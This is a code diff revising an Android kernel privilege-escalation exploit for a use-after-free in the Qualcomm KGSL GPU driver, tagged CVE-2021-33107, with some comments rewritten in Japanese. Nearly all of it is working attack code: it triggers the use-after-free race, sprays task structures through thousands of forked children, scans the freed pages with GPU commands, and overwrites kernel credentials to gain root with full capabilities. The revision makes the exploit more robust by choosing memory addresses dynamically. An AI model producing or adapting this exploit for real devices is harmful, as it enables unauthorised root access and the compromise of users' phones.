@@ -1,6 +1,6 @@
 /*
  * CVE-2021-33107 (CVE-33107) kgsl UAF exploit
- * Revised for Qualcomm KGSL driver (msm-4.14)
+ * 動的アドレス割り当て版（フェーズ1のmmap失敗に対処）
  * Compile: clang -target aarch64-none-linux-android28 -O2 -fPIE -pie -pthread -o exploit exploit.c
  */
 
@@ -125,15 +125,16 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 #define KGSL_CMDLIST_IB                0x00000001U
 #define KGSL_TIMESTAMP_RETIRED         0x00000002
 
-/* ---------- Exploit parameters ---------- */
-#define UAF_ADDR       0x7001ff000ULL
+/* ---------- 動的に決めるアドレス（Phase1でセット） ---------- */
+static uint64_t uaf_base = 0;
+static uint64_t overlap_addr = 0;
+static uint64_t placeholder_addr = 0;
+static uint64_t bogus_addr = 0;
+
 #define UAF_SIZE       0x10004000ULL          // 16MB+16KB
-#define OVERLAP_ADDR   0x7001fe000ULL
 #define OVERLAP_SIZE   0x7000ULL
-#define BOGUS_ADDR     0x700204000ULL
-#define BOGUS_SIZE     0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
+#define PLACEHOLDER_SIZE 0x10400000ULL        // 16MB+256KB
+#define BOGUS_SIZE     0xffffffffffefd000ULL  // 巨大（エラー用）
 
 #define SPRAY_PIDS     2000
 #define SCAN_DWORDS    560
@@ -260,12 +261,14 @@ static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     return a.id;
 }
 
-static void *gpuobj_mmap(size_t size, unsigned int id, void *hint) {
-    void *p = mmap(hint, size, PROT_READ | PROT_WRITE,
-                   MAP_SHARED | (hint ? MAP_FIXED : 0),
-                   kgsl_fd, (off_t)id << 12);
-    if (p == MAP_FAILED)
-        die("gpuobj_mmap");
+static void *gpuobj_mmap(size_t size, unsigned int id, void *hint, int fixed) {
+    int flags = MAP_SHARED | (fixed ? MAP_FIXED : 0);
+    void *p = mmap(hint, size, PROT_READ | PROT_WRITE, flags, kgsl_fd, (off_t)id << 12);
+    if (p == MAP_FAILED) {
+        printf("mmap(size=0x%zx, id=%u, hint=%p, fixed=%d) failed: %s\n",
+               size, id, hint, fixed, strerror(errno));
+        return MAP_FAILED;
+    }
     return p;
 }
 
@@ -309,20 +312,16 @@ static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
     return -2;
 }
 
-/* ---------- PM4 helpers (Type‑3, compatible with most Adreno) ---------- */
+/* ---------- PM4 helpers (Type‑3) ---------- */
 #define CP_NOP              0x10
 #define CP_MEM_WRITE        0x3D
-#define CP_MEM_TO_MEM       0x73   // Not available on A3xx, but present on A5xx+
+#define CP_MEM_TO_MEM       0x73   // A5xx+ で利用可（A3xx非対応）
 #define CP_WAIT_MEM_WRITES  0x12
 #define CP_EVENT_WRITE      0x46
 #define CACHE_FLUSH_TS      0x1C
 
 static inline uint32_t cp_type3_packet(uint32_t opcode, uint32_t count) {
     return (3 << 30) | (((count) - 1) << 16) | ((opcode & 0xFF) << 8);
-}
-
-static inline uint32_t cp_type0_packet(uint32_t regidx, uint32_t count) {
-    return (0 << 30) | (((count) - 1) << 16) | (regidx & 0x7FFF);
 }
 
 static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
@@ -351,7 +350,7 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
 
 /* ---------- Race thread ---------- */
 static void *race_thread(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = bogus_addr };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr,
         .priv_len = BOGUS_SIZE,
@@ -376,28 +375,61 @@ int main(int argc, char **argv) {
     printf("[*] Phase 0: KASLR detection\n");
     uint64_t init_cred_addr = detect_kaslr();
 
-    /* ---- Phase 1: Setup rbtree (UAF + placeholder) ---- */
-    printf("[*] Phase 1: Allocate UAF & placeholder\n");
+    /* ---- Phase 1: 動的アドレス取得 ---- */
+    printf("[*] Phase 1: Allocate UAF & placeholder (dynamic addresses)\n");
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP |
                            ((uint64_t)KGSL_CACHEMODE_WRITEBACK << KGSL_CACHEMODE_SHIFT);
 
     int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
-    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, (void *)UAF_ADDR);
-    munmap(uaf_m, UAF_SIZE);
+    // まず MAP_FIXED なしで mmap し、カーネルが選んだアドレスを取得
+    void *uaf_tmp = gpuobj_mmap(UAF_SIZE, uaf_id, NULL, 0);
+    if (uaf_tmp == MAP_FAILED) die("initial uaf mmap (non-fixed)");
+    uaf_base = (uint64_t)uaf_tmp;
+    munmap(uaf_tmp, UAF_SIZE); // 一旦解放し、後で固定マップで再マップ
 
-    // Placeholder to force physical page allocation pattern
+    // 固定アドレスで再マップ（成功すればそのアドレスを使う）
+    void *uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, (void *)uaf_base, 1);
+    if (uaf_m == MAP_FAILED) {
+        // 固定がダメなら、非固定で得たアドレスをそのまま使う（再度マップ）
+        printf("[!] MAP_FIXED failed, using non-fixed address 0x%lx\n", (unsigned long)uaf_base);
+        uaf_m = gpuobj_mmap(UAF_SIZE, uaf_id, (void *)uaf_base, 0);
+        if (uaf_m == MAP_FAILED) die("fallback uaf mmap");
+    } else {
+        printf("[+] UAF mapped at 0x%lx\n", (unsigned long)uaf_base);
+    }
+
+    // 他のアドレスを計算（重複しないように）
+    overlap_addr = uaf_base + 0x1000;          // UAF内のオフセット
+    placeholder_addr = uaf_base + UAF_SIZE + 0x1000000; // 16MB + 16MB 後
+    bogus_addr = uaf_base + 0x5000;            // UAF内の別位置（レース用）
+
+    // プレースホルダーを固定マップ（任意のアドレスで良いが、重複防止のため計算した位置を使う）
     int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, (void *)PLACEHOLDER_ADDR);
-    // keep placeholder mapped
+    void *ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, (void *)placeholder_addr, 1);
+    if (ph_m == MAP_FAILED) {
+        // 固定がダメなら非固定で
+        ph_m = gpuobj_mmap(PLACEHOLDER_SIZE, ph_id, NULL, 0);
+        if (ph_m == MAP_FAILED) die("placeholder mmap");
+        placeholder_addr = (uint64_t)ph_m;
+        printf("[!] Placeholder mapped at 0x%lx (non-fixed)\n", (unsigned long)placeholder_addr);
+    } else {
+        printf("[+] Placeholder mapped at 0x%lx\n", (unsigned long)placeholder_addr);
+    }
 
-    // Reserve BOGUS address
-    if (mmap((void *)BOGUS_ADDR, 0x1000, PROT_READ | PROT_WRITE,
-             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED)
-        die("mmap BOGUS");
+    // bogus_addr を匿名マップ（GPUとは無関係）
+    if (mmap((void *)bogus_addr, 0x1000, PROT_READ | PROT_WRITE,
+             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) {
+        // 失敗しても無視（代わりに他の場所を使う）
+        printf("[!] bogus_addr mmap failed, using another\n");
+        bogus_addr = uaf_base + 0x6000;
+        if (mmap((void *)bogus_addr, 0x1000, PROT_READ | PROT_WRITE,
+                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED)
+            die("bogus mmap");
+    }
 
-    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
-           (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
-           (unsigned long)PLACEHOLDER_ADDR);
+    printf("  UAF base=0x%lx, overlap=0x%lx, placeholder=0x%lx, bogus=0x%lx\n",
+           (unsigned long)uaf_base, (unsigned long)overlap_addr,
+           (unsigned long)placeholder_addr, (unsigned long)bogus_addr);
 
     /* ---- Phase 2: Race ---- */
     printf("[*] Phase 2: Trigger UAF race\n");
@@ -409,7 +441,7 @@ int main(int argc, char **argv) {
 
     int hit = 0;
     for (int i = 0; i < 5000000; i++) {
-        void *r = mmap((void *)OVERLAP_ADDR, OVERLAP_SIZE,
+        void *r = mmap((void *)overlap_addr, OVERLAP_SIZE,
                        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                        kgsl_fd, (off_t)ov_id << 12);
         int e = errno;
@@ -440,7 +472,7 @@ int main(int argc, char **argv) {
     gpuobj_free(uaf_id);
     printf("[+] UAF freed, physical pages released\n");
 
-    /* ---- Phase 4: Reclaim pages for task_struct spray ---- */
+    /* ---- Phase 4: Reclaim pages ---- */
     printf("[*] Phase 4: Reclaim pages (compact/drop caches)\n");
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
@@ -448,7 +480,7 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    /* ---- Phase 5: Fork many children to spray task_structs ---- */
+    /* ---- Phase 5: Fork children ---- */
     printf("[*] Phase 5: Spawning %d children\n", SPRAY_PIDS);
     int notify_pipe[2];
     if (pipe(notify_pipe) < 0)
@@ -466,12 +498,9 @@ int main(int argc, char **argv) {
             for (int j = 0; j < 1800; j++) {
                 usleep(200000);
                 if (getuid() == 0) {
-                    // Root achieved – notify parent and spawn shell
-                    usleep(50000);  // allow GPU writes to settle
+                    usleep(50000);
                     pid_t me = getpid();
                     write(notify_pipe[1], &me, sizeof(me));
-
-                    // Print diagnostics
                     char buf[4096];
                     int fd = open("/proc/self/status", O_RDONLY);
                     if (fd >= 0) {
@@ -500,27 +529,27 @@ int main(int argc, char **argv) {
     close(notify_pipe[1]);
     printf("  Spawned %d children\n", n_spray);
 
-    /* ---- Phase 6: Create GPU context and command buffers ---- */
+    /* ---- Phase 6: GPU context & buffers ---- */
     printf("[*] Phase 6: Setup GPU context and buffers\n");
     unsigned int ctx_id = create_context();
     printf("  context = %u\n", ctx_id);
 
     int ib_id = gpuobj_alloc(0x10000, alloc_flags);
-    void *ib_m = gpuobj_mmap(0x10000, ib_id, NULL);
+    void *ib_m = gpuobj_mmap(0x10000, ib_id, NULL, 0);
     uint64_t ib_ga = 0;
     gpuobj_info(ib_id, &ib_ga, NULL);
     printf("  IB id=%d gpuaddr=0x%lx\n", ib_id, (unsigned long)ib_ga);
 
     int dst_id = gpuobj_alloc(0x4000, alloc_flags);
-    void *dst_m = gpuobj_mmap(0x4000, dst_id, NULL);
+    void *dst_m = gpuobj_mmap(0x4000, dst_id, NULL, 0);
     uint64_t dst_ga = 0;
     gpuobj_info(dst_id, &dst_ga, NULL);
     printf("  DST id=%d gpuaddr=0x%lx\n", dst_id, (unsigned long)dst_ga);
 
-    /* ---- Phase 7: GPU scan for task_struct ---- */
+    /* ---- Phase 7: GPU scan (dynamic range) ---- */
     printf("[*] Phase 7: Scanning UAF range [0x%lx - 0x%lx]\n",
-           (unsigned long)(UAF_ADDR + 0x300000),
-           (unsigned long)(UAF_ADDR + UAF_SIZE - 0x1000));
+           (unsigned long)(uaf_base + 0x300000),
+           (unsigned long)(uaf_base + UAF_SIZE - 0x1000));
 
     uint64_t task_pages[16];
     uint32_t task_comm_offs[16];
@@ -529,8 +558,8 @@ int main(int argc, char **argv) {
     int cred_offs[32];
     int n_cred = 0;
 
-    uint64_t scan_start = UAF_ADDR + 0x300000;
-    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
+    uint64_t scan_start = uaf_base + 0x300000;
+    uint64_t end_va = uaf_base + UAF_SIZE - 0x1000;
 
     for (uint64_t va = scan_start; va < end_va && (n_task < 1 || n_cred < 1); va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0)
@@ -560,11 +589,10 @@ int main(int argc, char **argv) {
             break;
         __sync_synchronize();
 
-        // Now dst_m contains the page data
         uint32_t *data = (uint32_t *)dst_m;
         int comm_off = -1;
         for (int i = 0; i < SCAN_DWORDS - 1; i++) {
-            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) { // "TASK" "UAF!" reversed?
+            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
                 comm_off = i * 4;
                 break;
             }
@@ -594,7 +622,7 @@ int main(int argc, char **argv) {
 
     /* ---- Phase 8: Overwrite cred ---- */
     if (n_cred > 0) {
-        printf("[*] Phase 8: Overwriting %d creds with uid=0 and full caps\n", n_cred);
+        printf("[*] Phase 8: Overwriting %d creds with uid=0\n", n_cred);
         for (int p = 0; p < n_cred && p < 32; p++) {
             uint64_t cbase = cred_pages[p] + cred_offs[p];
             uint32_t *cmd = (uint32_t *)ib_m;
@@ -602,17 +630,15 @@ int main(int argc, char **argv) {
             int dw = 0;
             uint32_t addr_lo, addr_hi;
             split64(cbase + 0x04, &addr_lo, &addr_hi);
-            // Write 19 dwords: uid=0, euid=0, suid=0, fsuid=0, gid=0, egid=0, sgid=0, fsgid=0,
-            // securebits=4, caps full (permitted, effective, bset)
             cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 19);
             cmd[dw++] = addr_lo; cmd[dw++] = addr_hi;
-            for (int i = 0; i < 8; i++) cmd[dw++] = 0; // uid/gid fields
-            cmd[dw++] = 0x00000004; // securebits
-            cmd[dw++] = 0; cmd[dw++] = 0; // cap_inheritable
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_permitted (full)
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_effective
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F; // cap_bset
-            cmd[dw++] = 0; cmd[dw++] = 0; // cap_ambient
+            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
+            cmd[dw++] = 0x00000004;
+            cmd[dw++] = 0; cmd[dw++] = 0;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0; cmd[dw++] = 0;
             cmd[dw++] = cp_type3_packet(CP_NOP, 1);
             __sync_synchronize();
 
@@ -624,7 +650,7 @@ int main(int argc, char **argv) {
         }
     }
 
-    /* ---- Phase 9: Wait for root shell ---- */
+    /* ---- Phase 9: Wait for root ---- */
     printf("[*] Phase 9: Waiting for root notification\n");
     close(notify_pipe[1]);
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
